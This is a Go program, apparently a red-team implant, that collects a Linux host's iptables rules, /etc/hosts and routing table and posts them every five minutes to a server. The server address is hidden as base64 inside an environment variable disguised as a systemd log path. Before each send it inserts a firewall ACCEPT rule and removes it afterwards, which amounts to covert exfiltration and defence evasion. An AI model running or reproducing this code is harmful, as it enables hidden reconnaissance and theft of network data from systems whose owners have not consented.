// This go file will collect the host's firewall rules and other networking info, ship them back to a defined webserver,
// along with the ip
// disclaimer: this barely works
// @author: degenerat3
package main

import (
	"bytes"
	b64 "encoding/base64"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var serv = getServer() //IP of flask serv
var loopTime = 300     //sleep time in seconds

// turn encoded environment variable into ip addres
// example env: "/var/log/systemd-MTkyLjE2OC4xLjE=" => 192.168.1.1
func getServer() string {
	envVar := os.Getenv("ERROR_LOGGING") //fetch environment variable
	trimmedStr := strings.Replace(envVar, "/var/log/systemd-", "", 1)
	decoded, _ := b64.StdEncoding.DecodeString(trimmedStr)
	return string(decoded)
}

// return output of "iptables -L" as one large string
func getTables() string {
	cmd := exec.Command("/bin/bash", "-c", "iptables-save")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "Err"
	}
	return string(out)
}

// return output of "iptables -L" as one large string
func getHosts() string {
	cmd := exec.Command("/bin/bash", "-c", "cat /etc/hosts")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "Err"
	}
	return string(out)
}

// return output of "iptables -L" as one large string
func getRoutes() string {
	cmd := exec.Command("/bin/bash", "-c", "ip route")
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "Err"
	}
	return string(out)
}

func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ipStr := ad.IP.String()
	ipStr = strings.Replace(ipStr, ".", "-", -1)
	return ipStr
}

// post strings to flask server
func sendData(rules string, hosts string, routes string, ip string) {
	url1 := "http://" + serv + "/campfire" // turn ip into valid url
	jsonData := map[string]string{"rules": rules, "etchosts": hosts, "routes": routes, "ip": ip}
	jsonValue, _ := json.Marshal(jsonData)
	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT") //temporarily allow so we can send data
	insRule.Run()
	_, err := http.Post(url1, "application/json", bytes.NewBuffer(jsonValue))
	dropRule := exec.Command("iptables", "-D", "FILTER", "1")
	dropRule.Run()
	if err != nil {
		return
	}
	return
}

// fetch data then send it
func run() {
	rules := getTables()
	hosts := getHosts()
	routes := getRoutes()
	ip := getIP()
	sendData(rules, hosts, routes, ip)
}

func main() {
	argLen := len(os.Args)
	if argLen > 1 { // if there's an arg, only run once
		run()
	} else {
		for { // send data to webserver ever X seconds, until termination
			run()
			t := time.Duration(loopTime * 1000)
			time.Sleep(t * time.Millisecond)
		}
	}
}
